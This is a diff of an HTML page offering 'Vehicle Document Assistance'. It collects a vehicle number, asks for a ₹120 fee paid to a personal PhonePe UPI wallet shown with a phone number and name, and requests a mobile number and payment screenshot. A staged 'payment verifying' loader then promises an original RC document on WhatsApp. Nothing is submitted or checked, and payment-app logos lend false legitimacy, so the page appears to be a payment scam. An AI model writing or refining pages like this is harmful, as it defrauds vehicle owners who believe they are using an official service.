@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Vehicle Document Assistance Service</title>
+<title>Vehicle Document Assistance</title>
 
 <style>
 body{
@@ -13,9 +13,8 @@ background:linear-gradient(270deg,red,blue,green,purple,cyan);
 background-size:600% 600%;
 animation:bg 12s infinite alternate;
 display:flex;
-flex-direction:column;
-align-items:center;
 justify-content:center;
+align-items:center;
 min-height:100vh;
 }
 
@@ -53,8 +52,20 @@ cursor:pointer;
 
 img{
 width:220px;
-border-radius:14px;
 margin:12px 0;
+border-radius:12px;
+}
+
+.upi-icons{
+margin-top:8px;
+display:flex;
+justify-content:center;
+gap:10px;
+}
+
+.upi-icons img{
+width:35px;
+height:35px;
 }
 
 /* Loader */
@@ -64,12 +75,15 @@ top:0;
 left:0;
 width:100%;
 height:100%;
-background:rgba(0,0,0,0.7);
-display:flex;
+background:rgba(0,0,0,0.85);
+color:white;
+display:none;
+flex-direction:column;
 align-items:center;
 justify-content:center;
+text-align:center;
+padding:20px;
 z-index:9999;
-display:none;
 }
 
 .spinner{
@@ -79,11 +93,17 @@ border:5px solid #fff;
 border-top:5px solid #00ffd5;
 border-radius:50%;
 animation:spin 1s linear infinite;
+margin-bottom:15px;
 }
 
 @keyframes spin{
 0%{transform:rotate(0deg);}
 100%{transform:rotate(360deg);}
+}
+
+.success{
+font-size:18px;
+line-height:1.6;
 }
 </style>
 </head>
@@ -92,26 +112,50 @@ animation:spin 1s linear infinite;
 
 <div class="loader" id="loader">
 <div class="spinner"></div>
+<div id="loaderText">आपकी पेमेंट को verify किया जा रहा है।<br>कृपया back button न दबाएं।</div>
 </div>
 
 <div class="card">
 
+<!-- PAGE 1 -->
+<div id="p1">
+<h3>Enter Vehicle Number</h3>
+<input id="vehicle" placeholder="BR-09-AB-1234">
+<button onclick="goPay()">Continue</button>
+</div>
+
+<!-- PAGE 2 -->
+<div id="p2" class="hidden">
 <h3>Service Fee ₹120</h3>
 
-<!-- QR CODE -->
 <img src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=upi://pay?pa=8505039454.wallet@phonepe&pn=Ravi%20Kumar&am=120.00&cu=INR">
 
 <p>UPI ID: 8505039454.wallet@phonepe</p>
 
-<!-- PAY BUTTON -->
-<a onclick="showLoader()" href="upi://pay?pa=8505039454.wallet@phonepe&pn=Ravi%20Kumar&am=120.00&cu=INR">
+<a href="upi://pay?pa=8505039454.wallet@phonepe&pn=Ravi%20Kumar&am=120.00&cu=INR">
 <button type="button">Pay with UPI App</button>
 </a>
 
-<input placeholder="Mobile Number">
-<input type="file" accept="image/*">
+<div class="upi-icons">
+<img src="https://upload.wikimedia.org/wikipedia/commons/7/71/PhonePe_Logo.svg">
+<img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Google_Pay_Logo.svg">
+<img src="https://upload.wikimedia.org/wikipedia/commons/8/89/BHIM_logo.svg">
+</div>
 
-<button onclick="fakeSubmit()">Submit</button>
+<input id="mobile" placeholder="Mobile Number">
+<input type="file" id="file">
+
+<button onclick="submitForm()">Submit</button>
+</div>
+
+<!-- PAGE 3 -->
+<div id="p3" class="hidden success">
+<h3>🎉 Congratulations!</h3>
+<p>
+आपको आपके WhatsApp पर ORIGINAL RC का PDF शीघ्र ही प्राप्त होगा।
+</p>
+<button onclick="goHome()">Home</button>
+</div>
 
 </div>
 
@@ -119,16 +163,52 @@ animation:spin 1s linear infinite;
 
 function showLoader(){
 document.getElementById("loader").style.display="flex";
-setTimeout(()=>{
-document.getElementById("loader").style.display="none";
-},2000);
 }
 
-function fakeSubmit(){
+function hideLoader(){
+document.getElementById("loader").style.display="none";
+}
+
+function goPay(){
+if(!vehicle.value.trim()){
+alert("Enter vehicle number");
+return;
+}
+p1.classList.add("hidden");
+p2.classList.remove("hidden");
+}
+
+function submitForm(){
+if(!mobile.value.trim()){
+alert("Enter mobile number");
+return;
+}
+if(!file.files[0]){
+alert("Upload payment screenshot");
+return;
+}
+
 showLoader();
+
 setTimeout(()=>{
-alert("Request Submitted Successfully");
-},2000);
+hideLoader();
+p2.classList.add("hidden");
+p3.classList.remove("hidden");
+
+setTimeout(()=>{
+goHome();
+},7000);
+
+},3000);
+}
+
+function goHome(){
+p3.classList.add("hidden");
+p2.classList.add("hidden");
+p1.classList.remove("hidden");
+vehicle.value="";
+mobile.value="";
+file.value="";
 }
 
 </script>
